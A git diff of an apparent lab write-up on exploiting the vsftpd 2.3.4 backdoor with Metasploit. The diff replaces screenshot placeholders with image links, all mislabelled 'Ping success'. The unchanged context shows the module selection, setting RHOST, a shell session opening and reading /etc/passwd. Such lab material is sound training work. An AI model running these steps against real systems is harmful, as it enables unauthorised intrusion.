@@ -99,6 +99,7 @@ msfconsole
 ```
 
 ---
+![Ping success](msf-1.png)
 
 ### 2. Search for the vsftpd Exploit
 
@@ -111,7 +112,7 @@ Use the backdoor module:
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-📸 *Screenshot: Exploit module selected*
+![Ping success](msf-root-access.png)
 
 ---
 
@@ -121,7 +122,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST [target IP]
 ```
 
-📸 *Screenshot: RHOST configured*
+![Ping success](msf-root-access.png)
 
 ---
 
@@ -137,7 +138,7 @@ Found shell.
 Command shell session 1 opened...
 ```
 
-📸 *Screenshot: Metasploit shell session*
+![Ping success](root-access-change.png)
 
 ---
 
@@ -149,7 +150,7 @@ uname -a
 cat /etc/passwd
 ```
 
-📸 *Screenshot: Root access via Metasploit*
+![Ping success](root-access-change.png)
 
 ---
 
